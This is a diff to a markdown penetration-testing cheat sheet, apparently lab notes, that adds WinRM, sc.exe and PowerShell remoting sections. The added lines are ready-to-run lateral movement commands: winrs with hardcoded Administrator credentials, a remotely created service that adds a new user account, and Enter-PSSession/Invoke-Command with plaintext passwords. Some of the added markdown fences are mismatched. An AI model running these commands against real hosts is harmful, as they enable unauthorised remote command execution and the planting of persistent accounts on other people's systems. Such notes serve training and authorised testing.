@@ -43,6 +43,8 @@
   - [McAfee](#McAfee)
   - [WMI](#wmi)
   - [dnsrecon](#dnsrecon)
+  - [WinRM](#winrm)
+  - [sc.exe](#sc.exe)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -858,10 +860,33 @@ CommandLine = $Command
 }
 ```
 
-# dnsrecon
+### dnsrecon
 ```bash
 dnsrecon -d megacorpone.com -t std
 dnsrecon -d megacorp.com -D ~/list.txt -t brt
+```
+
+### WinRM
+```bash
+# winrs.exe
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+
+### sc.exe
+```bash
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+
+```
+
+# with powershell
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+Enter-PSSession -Computername TARGET -Credential $credential
+
+or
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 ```
 
 
